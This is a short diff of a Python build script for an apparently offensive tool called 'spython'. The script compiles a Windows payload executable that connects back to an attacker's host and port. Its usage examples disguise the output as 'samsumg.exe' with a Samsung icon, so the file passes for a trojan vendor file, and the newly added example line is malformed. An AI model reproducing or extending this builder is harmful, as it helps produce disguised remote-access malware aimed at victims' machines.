@@ -64,14 +64,15 @@ def main():
    os.rename("./dist/payload.exe","./payload.exe")
    os.rmdir("./dist")
    if args.name:
-      os.rename((__PAYLOAD_FILE_NAME[:-2]+"exe"),f"./executables/{args.name}.exe")
+      os.rename((__PAYLOAD_FILE_NAME[:-2]+"exe"),f"./executables/{args.name}")
 
 
 if __name__ == "__main__":
   #Parse command line arguments
   parse = argparse.ArgumentParser(description="This is an add-on for spython that generates the compiled version of the payload",
           formatter_class=argparse.RawDescriptionHelpFormatter,epilog=f"""Examples:
-          {os.path.basename(sys.argv[0])} --main 5000 --name samsumg.exe --host 192.168.100.176""")
+          {os.path.basename(sys.argv[0])} --main 5000 --name samsumg.exe --host 192.168.100.176
+          {os.path.basename(sys.argv[0])} --main 5000 --name samsumg.exe --host --icon ./templates/samsung.ico 192.168.100.176""")
   parse.add_argument("-H","--host",required=True,type=str,dest="host",help="IP address victim shoudl connect to")
   parse.add_argument("-M","--main",required=False,type=int,dest="port",default=5000,help="Main port on attacker server, see docs for informations. Defaults to 5000")
   parse.add_argument("-N","--name",required=False,type=str,dest="name",default="payload",help="File name of payload object file, defaults to payload.exe")
